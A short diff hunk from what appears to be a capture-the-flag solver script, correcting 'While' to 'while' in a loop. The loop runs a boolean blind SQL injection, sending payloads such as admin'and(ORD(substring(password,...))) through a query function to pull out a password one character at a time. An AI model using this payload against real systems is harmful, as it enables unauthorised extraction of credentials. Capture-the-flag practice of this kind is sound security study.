@@ -20,7 +20,7 @@ def query(payload):
 
 flag = ''
 i = 1
-While True:
+while True:
     for j in string.printable:
         if query(f"admin'and(ORD(substring(password,{i},1)))='{ord(j)}") == 1:
             flag += j
